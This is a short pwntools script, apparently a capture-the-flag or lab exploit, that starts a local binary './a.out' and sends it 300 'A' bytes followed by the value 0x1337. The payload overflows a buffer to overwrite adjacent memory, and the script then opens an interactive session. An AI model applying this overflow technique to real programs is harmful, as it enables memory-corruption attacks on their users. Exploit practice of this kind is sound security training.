from pwn import *

executable_name = "./a.out"
p = process(executable_name)
log.info(p.recvline())

buffer_length = 300
payload = b"A" * buffer_length + b"\x37\x13\x00\x00"
print(f"payload: {payload}")
p.sendline(payload)
p.interactive()
# p.interactive()